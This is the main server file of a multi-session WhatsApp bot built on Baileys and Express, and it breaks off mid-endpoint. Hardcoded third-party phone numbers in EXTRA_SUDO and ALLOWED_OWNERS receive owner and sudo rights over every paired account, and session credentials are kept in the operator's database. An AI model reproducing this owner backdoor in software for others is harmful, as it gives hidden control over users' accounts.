'use strict';

import 'dotenv/config';
import express from 'express';
import path from 'path';
import fs from 'fs';
import { fileURLToPath, pathToFileURL } from 'url';
import fse from 'fs-extra';
import bodyParser from 'body-parser';
import { MongoClient } from 'mongodb';
import pino from 'pino';
import axios from 'axios';

import makeWASocket, {
    useMultiFileAuthState,
    DisconnectReason,
    delay,
    getContentType,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    jidDecode,
    downloadContentFromMessage
} from '@whiskeysockets/baileys';

import makeInMemoryStore from './lib/InMemory.js';   // ✅ WAPAS ADD
import { commands } from './command.js';
import config from './config.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ─────────────────────────────────────
//  INLINE getGroupAdmins (lib/index.js se)
// ─────────────────────────────────────
function getGroupAdmins(participants) {
    if (!Array.isArray(participants)) return [];
    const admins = [];
    for (const p of participants) {
        const isAdmin = p.admin === 'admin' || p.admin === 'superadmin';
        if (isAdmin) {
            const id = p.id ? p.id.split(':')[0].trim() : '';
            if (id) {
                admins.push(id);
                const num = id.split('@')[0];
                if (num) admins.push(`${num}@s.whatsapp.net`);
            }
        }
    }
    return admins;
}

// ─────────────────────────────────────
//  CONSTANTS
// ─────────────────────────────────────
const PLUGINS_DIR = path.join(__dirname, 'plugins');
const SESSION_DIR = path.join(__dirname, 'session');
const PORT = process.env.PORT || config.PORT || 20013;

const EXTRA_SUDO = [
    '923106627089@s.whatsapp.net',
    '923422244714@s.whatsapp.net',
];

const activeSessions = new Map();
const pendingSessions = new Map();
const qrCodes = new Map();
const groupMetadataCache = new Map();
const MAX_SESSIONS = config.MAX_RETRIES || 3;
const botReadyState = new Map();

const checkIsBotAdmin = (meta, adminsList = [], botJid = '', botPhone = '', botLid = '', botLidPhone = '') => {
    if (!meta || !Array.isArray(meta.participants)) return false;
    if (botJid && adminsList.includes(botJid)) return true;
    if (botPhone && adminsList.includes(botPhone)) return true;
    if (botLid && adminsList.includes(botLid)) return true;
    if (botLidPhone && adminsList.includes(botLidPhone)) return true;

    return meta.participants.some(p => {
        const isAdmin = p.admin === 'admin' || p.admin === 'superadmin';
        if (!isAdmin) return false;
        const pId = p.id ? p.id.split(':')[0].trim() : '';
        const pNum = pId.split('@')[0];
        const pPhone = p.phoneNumber ? p.phoneNumber.split(':')[0].split('@')[0] : '';
        return (
            (botJid && pId === botJid) ||
            (botLid && pId === botLid) ||
            (botPhone && (pNum === botPhone || pPhone === botPhone)) ||
            (botLidPhone && pNum === botLidPhone)
        );
    });
};

const checkIsUserAdmin = (meta, adminsList = [], userSender = '', userSenderNumber = '', keyPart = '', keyPartAlt = '') => {
    if (!meta || !Array.isArray(meta.participants)) return false;
    const cleanSender = userSender ? userSender.split(':')[0].trim() : '';
    const cleanPart = keyPart ? keyPart.split(':')[0].trim() : '';
    const cleanPartAlt = keyPartAlt ? keyPartAlt.split(':')[0].trim() : '';
    const num = userSenderNumber || (cleanSender ? cleanSender.split('@')[0] : '');

    if (cleanSender && adminsList.includes(cleanSender)) return true;
    if (num && adminsList.includes(num)) return true;
    if (num && adminsList.includes(`${num}@s.whatsapp.net`)) return true;
    if (cleanPart && adminsList.includes(cleanPart)) return true;
    if (cleanPartAlt && adminsList.includes(cleanPartAlt)) return true;

    return meta.participants.some(p => {
        const isAdmin = p.admin === 'admin' || p.admin === 'superadmin';
        if (!isAdmin) return false;
        const pId = p.id ? p.id.split(':')[0].trim() : '';
        const pNum = pId.split('@')[0];
        const pPhone = p.phoneNumber ? p.phoneNumber.split(':')[0].split('@')[0] : '';
        return (
            (cleanSender && pId === cleanSender) ||
            (cleanPart && pId === cleanPart) ||
            (cleanPartAlt && pId === cleanPartAlt) ||
            (num && (pNum === num || pPhone === num))
        );
    });
};

const ALLOWED_OWNERS = ["923253617422", "923213373680", "923029450054", "923043788282", "923422244714"];
const REACT_EMOJIS = ["❤️", "👍", "🔥", "🎉", "💯", "😎", "🤣", "🥳", "👏", "💪"];
const HEART_EMOJIS = ['❤️','❤️','🧡','💛','💚','🩵','💙','💜','🖤','🩶','🤍','🤎','💔','❤️‍🔥','❤️‍🦹','❣️','💕','💞','💓','💗','💖','💘','💝','💟'];

// ─────────────────────────────────────
//  MONGODB
// ─────────────────────────────────────
let mongoClient = null;
let db = null;

async function connectMongo() {
    try {
        mongoClient = new MongoClient(config.MONGODB_URL);
        await mongoClient.connect();
        db = mongoClient.db(config.DB_NAME);

        await db.collection(config.COLLECTIONS.SESSIONS).createIndex({ number: 1 }, { unique: true });
        await db.collection(config.COLLECTIONS.NUMBERS).createIndex({ number: 1 }, { unique: true });

        console.log('✅ MongoDB Connected');
    } catch (err) {
        console.error('❌ MongoDB Error:', err.message);
    }
}

async function saveSession(number, sessionData) {
    if (!db) return;
    try {
        const base64 = Buffer.from(JSON.stringify(sessionData)).toString('base64');
        await db.collection(config.COLLECTIONS.SESSIONS).updateOne(
            { number },
            { $set: { number, sessionData: base64, lastUpdated: new Date(), createdAt: new Date() } },
            { upsert: true }
        );
    } catch (err) {
        console.error('❌ Error saving session:', err.message);
    }
}

async function loadSession(number) {
    if (!db) return null;
    try {
        const doc = await db.collection(config.COLLECTIONS.SESSIONS).findOne({ number });
        if (!doc?.sessionData) return null;
        return JSON.parse(Buffer.from(doc.sessionData, 'base64').toString());
    } catch (err) {
        console.log('❌ Load session error:', err.message);
        return null;
    }
}

async function restoreMongoSession(number) {
    try {
        const session = await loadSession(number);
        if (!session) return false;

        const sessionPath = path.join(SESSION_DIR, `session_${number}`);
        fse.ensureDirSync(sessionPath);
        fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(session, null, 2));
        console.log(`♻️ Restored Mongo session: ${number}`);
        return true;
    } catch (err) {
        console.log('❌ Restore session error:', err.message);
        return false;
    }
}

async function deleteSession(number) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.SESSIONS).deleteOne({ number });
    } catch (err) {
        console.error('❌ Error deleting session:', err.message);
    }
}

async function loadConfig(number) {
    if (!db) return { ...config.DEFAULT_SETTINGS };
    try {
        const doc = await db.collection(config.COLLECTIONS.CONFIGS).findOne({ number });
        if (!doc || !doc.config || Object.keys(doc.config).length === 0) {
            const defaultCfg = { ...config.DEFAULT_SETTINGS };
            await db.collection(config.COLLECTIONS.CONFIGS).updateOne(
                { number },
                { $set: { number, config: defaultCfg, lastUpdated: new Date() } },
                { upsert: true }
            );
            return defaultCfg;
        }
        return doc.config;
    } catch (err) {
        return { ...config.DEFAULT_SETTINGS };
    }
}

async function saveConfig(number, cfg) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.CONFIGS).updateOne(
            { number },
            { $set: { number, config: cfg, lastUpdated: new Date() } },
            { upsert: true }
        );
    } catch (err) {
        console.error('❌ Error saving config:', err.message);
    }
}

async function deleteConfig(number) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.CONFIGS).deleteOne({ number });
    } catch (err) {
        console.error('❌ Error deleting config:', err.message);
    }
}

async function isFirstActivation(number) {
    if (!db) return true;
    try {
        const doc = await db.collection(config.COLLECTIONS.CONFIGS).findOne({ number });
        return !doc?.activated;
    } catch (_) {
        return true;
    }
}

async function markActivated(number) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.CONFIGS).updateOne(
            { number },
            { $set: { activated: true, activatedAt: new Date() } },
            { upsert: true }
        );
    } catch (_) { }
}

async function addActiveNumber(number) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.NUMBERS).updateOne(
            { number },
            { $set: { number, addedAt: new Date(), lastActive: new Date() } },
            { upsert: true }
        );
    } catch (err) {
        console.error('❌ Error saving number:', err.message);
    }
}

async function getActiveNumbers() {
    if (!db) return [];
    try {
        return (await db.collection(config.COLLECTIONS.NUMBERS).find().toArray()).map(d => d.number);
    } catch (err) {
        return [];
    }
}

async function removeActiveNumber(number) {
    if (!db) return;
    try {
        await db.collection(config.COLLECTIONS.NUMBERS).deleteOne({ number });
    } catch (err) {
        console.error('❌ Error deleting number:', err.message);
    }
}

// ─────────────────────────────────────
//  PLUGIN LOADER
// ─────────────────────────────────────
async function loadPluginFiles() {
    if (!fs.existsSync(PLUGINS_DIR)) {
        console.log('📁 Creating plugins directory...');
        fse.ensureDirSync(PLUGINS_DIR);
        return;
    }

    const files = fs.readdirSync(PLUGINS_DIR).filter(f => f.endsWith('.js'));
    if (files.length === 0) {
        console.log('⚠️ No plugins found in plugins folder');
        return;
    }

    console.log(`📦 Loading ${files.length} plugins...`);
    for (const file of files) {
        try {
            const pluginPath = path.join(PLUGINS_DIR, file);
            const fileUrl = pathToFileURL(pluginPath).href + `?t=${Date.now()}`;
            await import(fileUrl);
            console.log(`✅ Loaded: ${file}`);
        } catch (err) {
            console.error(`❌ Error loading plugin ${file}:`, err.message);
        }
    }
}

// ─────────────────────────────────────
//  SESSION CLEANUP
// ─────────────────────────────────────
async function cleanupSession(number, reason = 'Session expired') {
    console.log(`🧹 Cleanup for ${number}: ${reason}`);
    try {
        qrCodes.delete(number);
        const sessionPath = path.join(SESSION_DIR, `session_${number}`);
        if (fs.existsSync(sessionPath)) fse.removeSync(sessionPath);

        const sock = activeSessions.get(number);
        if (sock) {
            if (sock.storeClearInterval) clearInterval(sock.storeClearInterval);
            try { sock.ws.close(); } catch (_) { }
            activeSessions.delete(number);
        }

        await deleteSession(number);
        await deleteConfig(number);
        await removeActiveNumber(number);
    } catch (err) {
        console.error(`❌ Cleanup error for ${number}:`, err.message);
    }
}

// ─────────────────────────────────────
//  WHATSAPP BOT CORE
// ─────────────────────────────────────
function attachBotHandlers(sock, number, userConfig, saveCreds) {

    sock.ev.on('creds.update', async () => {
        try {
            await saveCreds();
            const credsPath = path.join(SESSION_DIR, `session_${number}`, 'creds.json');
            if (!fs.existsSync(credsPath)) return;
            const raw = fs.readFileSync(credsPath, 'utf8');
            if (!raw || raw.trim().length < 5) return;
            let creds;
            try { creds = JSON.parse(raw); } catch { return; }
            await saveSession(number, creds);
        } catch (err) {
            console.log('❌ Creds update error:', err.message);
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) qrCodes.set(number, qr);

        if (connection === 'open') {
            qrCodes.delete(number);
            pendingSessions.delete(number);
            activeSessions.set(number, sock);
            await addActiveNumber(number);
            sock.userConfig = userConfig;

            // ✅ Bind store to socket events
            if (sock.store) {
                sock.store.bind(sock.ev);
            }

            console.log(`🦾 Bot connected: ${number}`);
            botReadyState.set(number, { ready: true, readyTime: Date.now() });
            console.log(`✅ Bot ${number} is READY`);

            const firstTime = await isFirstActivation(number);
            if (firstTime) {
                await markActivated(number);
                try {
                    const botJid = sock.user?.id;
                    if (botJid && userConfig.STARTING_MSG) {
                        await sock.sendMessage(botJid, { text: userConfig.STARTING_MSG });
                    }
                } catch (_) { }
            }

        } else if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

            if (sock.storeClearInterval) clearInterval(sock.storeClearInterval);

            activeSessions.delete(number);
            pendingSessions.delete(number);
            botReadyState.delete(number);

            if (shouldReconnect) {
                console.log(`📄 Reconnecting ${number}...`);
                setTimeout(() => startBot(number), 3000);
            } else {
                await cleanupSession(number, 'loggedOut');
            }
        }
    });

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        try {
            const freshCfg = await loadConfig(number);
            Object.assign(userConfig, freshCfg);
            sock.userConfig = userConfig;
        } catch (_) {}

        for (const msg of messages) {
            if (!msg.message) continue;
            const jid2 = msg.key.remoteJid;

            // ================= STATUS VIEW HANDLING =================
            if (jid2 === "status@broadcast") {

                // ✅ Save status message to store
                const statuss = msg.key.remoteJidAlt || msg.key.participantAlt || msg.key.remoteJid;
                const msgToSave = { ...msg, sender: statuss };
                if (sock.store) {
                    sock.store.upsertMessage(msgToSave);
                }

                let senderRaw = null;
                if (msg.key.participantAlt) senderRaw = msg.key.participantAlt;
                else if (msg.key.remoteJidAlt) senderRaw = msg.key.remoteJidAlt;
                else if (msg.key.participant) senderRaw = msg.key.participant;
                if (!senderRaw) return;

                async function resolveStatusSender(jid2) {
                    try {
                        if (jid2.includes("@lid")) {
                            if (sock?.signalRepository?.lidMapping?.getPNForLID) {
                                const mapped = await sock.signalRepository.lidMapping.getPNForLID(jid2);
                                if (mapped) return mapped;
                            }
                            if (sock?.lidToPhoneNumber) {
                                const mapped = await sock.lidToPhoneNumber(jid2);
                                if (mapped) return mapped;
                            }
                            return jid2;
                        }
                        if (jid2.includes(":")) {
                            return jid2.split(":")[0] + "@s.whatsapp.net";
                        }
                        return jid2;
                    } catch (err) {
                        return jid2;
                    }
                }

                const statusSender = await resolveStatusSender(senderRaw);

                // ✅ ONLY AUTO STATUS VIEW
                if (userConfig.AUTO_VIEW_STATUS === "true") {
                    for (let attempt = 1; attempt <= 3; attempt++) {
                        try {
                            await sock.sendReceipt("status@broadcast", statusSender, [msg.key.id], "read");
                            break;
                        } catch (err) {
                            try {
                                await sock.readMessages([msg.key]);
                                break;
                            } catch (e) {
                                if (attempt < 3) await new Promise(resolve => setTimeout(resolve, 2000));
                            }
                        }
                    }
                }
                return;
            }
            // =========================================================

            if (msg.message?.senderKeyDistributionMessage) continue;
            if (msg.key?.id?.length < 16) continue;

            try {
                // ✅ Save normal message to store
                const isGrp = msg.key.remoteJid?.endsWith('@g.us');
                const msgToSave = {
                    ...msg,
                    sender: isGrp ? msg.key.participant : msg.key.remoteJid,
                };
                if (sock.store) {
                    sock.store.upsertMessage(msgToSave);
                }

                await handleMessage(sock, msg, userConfig, number);
            } catch (err) {
                console.error('❌ Message error:', err.message);
            }
        }
    });
}

// ================= START BOT =================
async function startBot(number) {
    if (activeSessions.has(number)) return activeSessions.get(number);
    if (activeSessions.size >= MAX_SESSIONS) {
        console.warn(`⚠️ Max sessions limit reached (${MAX_SESSIONS})`);
        return null;
    }

    const sessionPath = path.join(SESSION_DIR, `session_${number}`);
    fse.ensureDirSync(sessionPath);

    const credsPath = path.join(sessionPath, 'creds.json');
    if (!fs.existsSync(credsPath)) {
        await restoreMongoSession(number);
    }

    // ✅ Create In-Memory Store
    const store = makeInMemoryStore({
        maxMessagesPerChat: 500,
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();
    const userConfig = await loadConfig(number);
    const logger = pino({ level: 'fatal' });

    botReadyState.set(number, { ready: false, readyTime: Date.now() });

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, logger),
        },
        printQRInTerminal: false,
        logger,
        syncFullHistory: false,
        generateHighQualityLinkPreview: true,
        markOnlineOnConnect: false,
        store: store,                    // ✅ Store pass kiya
        getMessage: async (key) => {     // ✅ getMessage handler
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id);
                return msg ? msg.message : undefined;
            }
            return undefined;
        }
    });

    sock.store = store;                  // ✅ Socket pe store attach

    // ✅ Hourly store clear to prevent memory bloat
    sock.storeClearInterval = setInterval(() => {
        try {
            if (store) {
                if (store.chats && typeof store.chats.clear === 'function') {
                    store.chats.clear();
                } else {
                    store.chats = {};
                }
                store.messages = {};
                store.contacts = {};
                store.groupMetadata = {};
                store.presences = {};
                console.log(`🧹 Hourly clear: In-memory store cleared for ${number}`);
            }
        } catch (err) {
            console.error(`❌ Error clearing store for ${number}:`, err.message);
        }
    }, 60 * 60 * 1000); // 1 hour

    attachBotHandlers(sock, number, userConfig, saveCreds);

    setTimeout(() => {
        if (activeSessions.has(number)) {
            botReadyState.set(number, { ready: true, readyTime: Date.now() });
            console.log(`✅ Bot ${number} marked READY after setup delay`);
        }
    }, 3000);

    return sock;
}

// ─────────────────────────────────────
//  MESSAGE HANDLER
// ─────────────────────────────────────
async function handleMessage(sock, msg, userConfig, botNumber) {
    const readyState = botReadyState.get(botNumber);
    if (!readyState || !readyState.ready) {
        let waitCount = 0;
        while (!botReadyState.get(botNumber)?.ready && waitCount < 10) {
            await delay(500);
            waitCount++;
        }
    }

    userConfig = userConfig || {};
    const jid = msg.key?.remoteJid || '';
    const isGroup = jid.endsWith('@g.us');
    const bandaheali = sock.user?.id ? sock.user.id.split(":")[0] + "@s.whatsapp.net" : "";
    const sender = msg.key.fromMe ? bandaheali : isGroup ? (msg.key?.participantAlt || msg.key?.participant || msg.participant) : (msg.key?.remoteJidAlt || msg.key?.participant || msg.key?.remoteJid);

    let senderNumber = sender;
    if (typeof sender === 'string' && sender.includes('@')) {
        senderNumber = sender.split('@')[0];
    }

    const isAllowedOwner = ALLOWED_OWNERS.includes(senderNumber);
    const isCreator = isAllowedOwner || msg.key.fromMe;
    const isOwner = isCreator;

    // NEWSLETTER
    if (jid && jid.includes('@newsletter')) return;

    // AUTO REACT
    if (userConfig.AUTO_REACT === 'true' && !msg.message?.protocolMessage && !msg.message?.senderKeyDistributionMessage) {
        const emoji = REACT_EMOJIS[Math.floor(Math.random() * REACT_EMOJIS.length)];
        try { await sock.sendMessage(jid, { react: { text: emoji, key: msg.key } }); } catch (_) {}
    } else if (userConfig.CUSTOM_REACT === 'true' && !msg.message?.protocolMessage) {
        const CUSTOM_EMOJIS = userConfig.CUSTOM_EMOJIS || ['😊', '👍', '🚀', '💻', '🎉', '🔥'];
        const cemoji = CUSTOM_EMOJIS[Math.floor(Math.random() * CUSTOM_EMOJIS.length)];
        try { await sock.sendMessage(jid, { react: { text: cemoji, key: msg.key } }); } catch (_) {}
    } else if (userConfig.HEART_REACT === 'true' && !msg.message?.protocolMessage) {
        const hemoji = HEART_EMOJIS[Math.floor(Math.random() * HEART_EMOJIS.length)];
        try { await sock.sendMessage(jid, { react: { text: hemoji, key: msg.key } }); } catch (_) {}
    }

    const fromMe = msg.key?.fromMe;
    const pushname = msg.pushName || 'Sin Nombre';
    const botNumber2 = sock.user?.id ? sock.user.id.split(':')[0] : '';
    const botPhone = sock.user?.id ? sock.user.id.split(':')[0].split('@')[0] : '';
    const botJid = botPhone ? `${botPhone}@s.whatsapp.net` : '';
    const botLid = sock.user?.lid ? sock.user.lid.split(':')[0] : '';
    const botLidPhone = botLid ? botLid.split('@')[0] : '';
    const isMe = fromMe;

    let groupName = '';
    let groupAdmins = [];
    let isBotAdmins = false;
    let isAdmins = false;
    let groupMetadata = null;

    if (isGroup) {
        try {
            const CACHE_TTL = 30000;
            const cached = groupMetadataCache.get(jid);
            const isFresh = cached && (Date.now() - cached.time < CACHE_TTL);

            if (isFresh && cached.data) {
                groupMetadata = cached.data;
            } else if (sock.store?.groupMetadata?.[jid] && isFresh) {
                groupMetadata = sock.store.groupMetadata[jid];
            } else {
                try {
                    groupMetadata = await Promise.race([
                        sock.groupMetadata(jid),
                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 4000))
                    ]);
                } catch {
                    groupMetadata = sock.store?.groupMetadata?.[jid] || cached?.data || null;
                }

                if (groupMetadata) {
                    groupMetadataCache.set(jid, { data: groupMetadata, time: Date.now() });
                    if (sock.store) {
                        if (!sock.store.groupMetadata) sock.store.groupMetadata = {};
                        sock.store.groupMetadata[jid] = groupMetadata;
                    }
                }
            }

            if (groupMetadata) {
                groupName = groupMetadata?.subject || '';
                groupAdmins = getGroupAdmins(groupMetadata?.participants || []);
                isBotAdmins = checkIsBotAdmin(groupMetadata, groupAdmins, botJid, botPhone, botLid, botLidPhone);
                isAdmins = checkIsUserAdmin(groupMetadata, groupAdmins, sender, senderNumber, msg.key?.participant, msg.key?.participantAlt);
            }
        } catch (e) {
            console.log("⚠️ Group metadata error:", e.message);
        }
    }

    const mtype = getContentType(msg.message);
    let body = '';
    if (mtype === 'conversation') body = msg.message.conversation;
    else if (mtype === 'extendedTextMessage') body = msg.message.extendedTextMessage?.text;
    else if (mtype === 'imageMessage') body = msg.message.imageMessage?.caption;
    else if (mtype === 'videoMessage') body = msg.message.videoMessage?.caption;
    else if (mtype === 'buttonsResponseMessage') body = msg.message.buttonsResponseMessage?.selectedButtonId;
    else if (mtype === 'listResponseMessage') body = msg.message.listResponseMessage?.singleSelectReply?.selectedRowId;
    else if (mtype === 'templateButtonReplyMessage') body = msg.message.templateButtonReplyMessage?.selectedId;
    body = body || '';

    const msgType2 = Object.keys(msg.message || {})[0];
    const contextInfo = msg.message?.[msgType2]?.contextInfo || {};
    const quotedMsg = contextInfo.quotedMessage || null;
    const quotedParticipant = contextInfo.participant || null;

    const prefix = userConfig.PREFIX || config.PREFIX;
    let isCmd;
    if (userConfig.PREFIX === "null" || userConfig.PREFIX === null) {
        isCmd = true;
    } else {
        isCmd = body.startsWith(prefix);
    }

    let args = [];
    let command = '';
    let q = '';
    if (isCmd) {
        if (userConfig.PREFIX === "null" || userConfig.PREFIX === null) {
            args = body.trim().split(/\s+/);
            command = args.shift().toLowerCase();
            q = args.join(' ');
        } else {
            args = body.slice(prefix.length).trim().split(/\s+/);
            command = args.shift().toLowerCase();
            q = args.join(' ');
        }
    }

    const SUDO = [ ...((userConfig?.SUDO) || (config?.SUDO) || []), ...EXTRA_SUDO ];
    const isSudo = SUDO.includes(sender) || fromMe;
    const BANNED = userConfig.BANNED || config.BANNED || [];
    const isBanned = BANNED.some(b => b === senderNumber || b === sender);
    if (isBanned) return;

    const MODE = userConfig.MODE || config.MODE || "public";
    const isPrivileged = isSudo || fromMe;
    if (MODE === "private" && !isPrivileged) return;
    else if (MODE === "inbox" && !isPrivileged && isGroup) return;
    else if (MODE === "groups" && !isPrivileged && !isGroup) return;
    else if (MODE === "self" && !isPrivileged) return;

    const smallCapsMap = {
        'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ',
        'n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ',
        'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ',
        'N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'
    };
    const toSmallCaps = (str) => {
        if (typeof str !== 'string') str = String(str);
        return str.split('').map(c => smallCapsMap[c] || c).join('');
    };

    const reply = (text) => sock.sendMessage(jid, { text: toSmallCaps(text) }, { quoted: msg });
    const Reply = (text) => sock.sendMessage(jid, { text: text }, { quoted: msg });
    const react = (emoji) => sock.sendMessage(jid, { react: { text: emoji, key: msg.key } });

    sock.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
        } else return jid;
    };

    sock.downloadMediaMessage = async (message) => {
        const type = message.mtype;
        const media = message.message[type];
        const stream = await downloadContentFromMessage(media, type.replace('Message', ''));
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    };

    const quoted = quotedMsg ? {
        message: quotedMsg,
        key: { remoteJid: jid, fromMe: false, id: contextInfo.stanzaId, participant: quotedParticipant },
        sender: quotedParticipant,
        mtype: getContentType(quotedMsg),
        download: () => sock.downloadMediaMessage({ message: quotedMsg, mtype: getContentType(quotedMsg) })
    } : null;

    const mentionedJid = contextInfo.mentionedJid || [];
    const target = mentionedJid?.[0] || quotedParticipant || null;

    const processedM = {
        key: msg.key,
        message: msg.message,
        messageTimestamp: msg.messageTimestamp,
        pushName: msg.pushName,
        from: jid,
        sender: sender,
        senderNumber: senderNumber,
        fromMe: fromMe,
        body: body,
        mtype: mtype,
        isGroup: isGroup,
        quoted: quoted,
        mentionedJid: mentionedJid,
        pushname: pushname,
        react,
        target,
        chat: jid,
        reply: Reply
    };

    const ctx = {
        from: jid,
        body,
        isCmd,
        command,
        args,
        q,
        text: q,
        prefix,
        isGroup,
        sender: sender,
        senderNumber: senderNumber,
        senderNum: senderNumber,
        sanitizedNumber: botNumber,
        botNumber,
        botNumber2,
        pushname,
        isMe,
        isOwner: isOwner,
        isCreator: isCreator,
        isDev: isAllowedOwner,
        isAdmins,
        isBotAdmins,
        groupMetadata,
        groupName,
        participants: groupMetadata?.participants || [],
        groupAdmins,
        quoted,
        mentionedJid,
        l: sock,
        reply,
        Reply,
        react,
        userConfig,
        config,
        target,
        updateUserConfig: async (num, cfg) => {
            await saveConfig(num || botNumber, cfg);
            Object.assign(userConfig, cfg);
            sock.userConfig = userConfig;
        },
    };

    // Body listeners
    for (const cmd of commands) {
        try {
            if (cmd.on === "body" && typeof cmd.function === "function") {
                await cmd.function(sock, processedM, processedM, ctx);
            }
        } catch (err) {
            console.error(`❌ Body Listener Error:`, err.message);
        }
    }

    // Command matcher
    const matchedCommands = commands.filter(c => {
        if (c.pattern) {
            if (c.pattern instanceof RegExp) {
                if (c.pattern.test(command)) return true;
            } else {
                if (String(c.pattern).toLowerCase() === command) return true;
            }
        }
        if (c.alias && Array.isArray(c.alias) && c.alias.includes(command)) return true;
        return false;
    });

    if (matchedCommands.length > 0) {
        for (const matched of matchedCommands) {
            if (matched.react) {
                try { await react(matched.react); } catch (_) { }
            }
            try {
                await matched.function(sock, processedM, processedM, ctx);
            } catch (err) {
                console.error(`⚠️ Command failed [${command}]:`, err.message);
                try { await reply(`⚠️ Error: ${err.message}`); } catch (_) { }
            }
        }
    }
}

// ─────────────────────────────────────
//  EXPRESS SERVER
// ─────────────────────────────────────
const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/lib', express.static(path.join(__dirname, 'lib')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'lib', 'main.html'));
});

app.get('/api/code', async (req, res) => {
    const number = req.query.number;
    if (!number) return res.json({ error: 'Number parameter is required' });
    if (!/^\d+$/.test(number)) return res.json({ error: 'Invalid number format. Only digits are allowed.' });
    if (activeSessions.has(number)) return res.json({ error: 'already_connected', message: 'This number is already connected' });
    if (activeSessions.size >= MAX_SESSIONS) return res.json({ error: 'Maximum sessions limit reached', message: `Maximum ${MAX_SESSIONS} active sessions allowed.` });
    if (pendingSessions.has(number)) {
        try { pendingSessions.get(number).ws?.close(); } catch (_) { }
        pendingSessions.delete(number);
    }

    const userConfig = await loadConfig(number);
    try {
        const sessionPath = path.join(SESSION_DIR, `session_${number}`);
        if (fs.existsSync(sessionPath)) fse.removeSync(sessionPath);
        fse.ensureDirSync(sessionPath);

        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();
        const logger = pino({ level: 'fatal' });

        const sock = makeWASocket({
            version,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
            printQRInTerminal: false,
            logger,
            syncFullHistory: false,
            generateHighQualityLinkPreview: true,
            markOnlineOnConnect: false
        });

        attachBotHandlers(sock, number, userConfig, saveCreds);

        if (!state.creds.registered) {
            pendingSessions.set(number, sock);
            await delay(1500);
            const code = await sock.requestPairingCode(number);
            return res.json({ code });
        }
        return res.json({ message: 'already_connected' });
    } catch (err) {
        pendingSessions.delete(number);
        console.error('Pairing error:', err.message);
        return res.json({ error: 'Failed to generate pairing code', message: 'Please try again or check your number format' });
    }
});

app.get('/api/active', (req, res) => {
    res.json({ count: activeSessions.size, limit: MAX_SESSIONS });
});

app.get('/api/qr', async (req, res) => {
    const number = req.query.number;
    if (!number) return res.json({ error: 'Number parameter is required' });
    if (!/^\d+$/.test(number)) return res.json({ error: 'Invalid number format. Only digits are allowed.' });
    if (activeSessions.has(number)) return res.json({ error: 'already_connected', message: 'This number is already connected', status: 'connected' });

    if (pendingSessions.has(number)) {
        const qr = qrCodes.get(number);
        if (qr) {
            const qrImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qr)}`;
            return res.json({ qr, qrImageUrl, status: 'qr' });
        }
        return res.json({ status: 'waiting', message: 'Waiting for QR code generation...' });
    }

    if (activeSessions.size >= MAX_SESSIONS) {
        return res.json({ error: 'Maximum sessions limit reached', message: `Maximum ${MAX_SESSIONS} active sessions allowed.` });
    }

    try {
        const sessionPath = path.join(SESSION_DIR, `session_${number}`);
        if (fs.existsSync(sessionPath)) fse.removeSync(sessionPath);
        fse.ensureDirSync(sessionPath);

        const sock = await startBot(number);
        if (!sock) return res.json({ error: 'Failed to start bot session' });
        pendingSessions.set(number, sock);

        for (let i = 0; i < 10; i++) {
            await delay(1000);
            const qr = qrCodes.get(number);
            if (qr) {
                const qrImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qr)}`;
                return res.json({ qr, qrImageUrl, status: 'qr' });
            }
        }

        return res.json({ status: 'waiting', message: 'QR code is being generated, please refresh/poll in a moment.' });
    } catch (err) {
        pendingSessions.delete(number);
        console.error('QR generation error:', err.message);
        return res.json({ error: 'Failed to initialize QR code session', message: err.message });
    }
});

app.get('/api/debug/:number', async (req, res) => {
    const number = req.params.number;
    const configData = await loadConfig(number);
    const readyState = botReadyState.get(number);
    res.json({
        number,
        config: {
            MODE: configData.MODE,
            PREFIX: configData.PREFIX,
            AUTO_REACT: configData.AUTO_REACT,
            AUTO_VIEW_STATUS: configData.AUTO_VIEW_STATUS,
        },
        readyState: readyState || { ready: false },
        isActive: activeSessions.has(number),
        sessionCount: activeSessions.size,
